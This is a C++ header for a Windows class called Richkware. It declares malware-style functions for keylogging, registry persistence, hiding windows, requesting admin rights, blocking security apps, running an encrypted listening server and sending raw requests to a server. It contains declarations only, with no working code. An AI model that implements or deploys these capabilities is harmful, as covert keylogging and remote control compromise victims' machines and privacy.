/*
 *      Copyright 2016 Riccardo Melioli. All Rights Reserved.
 */

#ifndef FUNCTIONS_H_
#define FUNCTIONS_H_

#define _WIN32_WINNT  0x501
#define MAX_THREAD 8

#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <shellapi.h>
#include <winbase.h>
#include <windef.h>
#include <winerror.h>
#include <winnt.h>
#include <winreg.h>
#include <winuser.h>

#include <iostream>
#include <fstream>
#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <sstream>
#include <ctime>
#include <string.h>
#include <cstring>
#include <string>
#include <iterator>
#include <list>
#include <map>

class Richkware {
public:
	HANDLE hBlockAppsTh;
	
	void SaveValueReg(const char* path, const char* key, const char* value);
	std::string LoadValueReg(const char* path, const char* key);
	//void SaveFileDir(const char* path);
public:
	std::map<std::string, std::string> session;
	std::list<const char*> dangerousApps;

	void SaveSession(const char* EncryptionKey);
	void LoadSession(const char* EncryptionKey);
	BOOL IsAdmin();
	void RequestAdminPrivileges();
	void Persistance();
	void StealthWindow(const char* window);
	void OpenApp(const char* app);
	void BlockApps();
	void UnBlockApps();
	void Keylogger(const char* fileName);
	bool CheckExistance();
	//void FirstRun();

	int StartServer(const char* port, const char* EncryptionKey = NULL);
	const char* RawRequest(const char * serverAddress, const char* port, const char* request);
	
	void Hibernation();
	void RandMouse();

};

struct ClientSocketArgs {
	SOCKET ClientSocket;
	const char* EncryptionKey;
};

std::string EncryptDecrypt(std::string input, const char* key);

DWORD WINAPI ClientSocketThread(void* arg);
DWORD WINAPI BlockAppsThread(void* arg);
DWORD WINAPI KeyloggerThread(void* arg);

#endif /* FUNCTIONS_H_ */
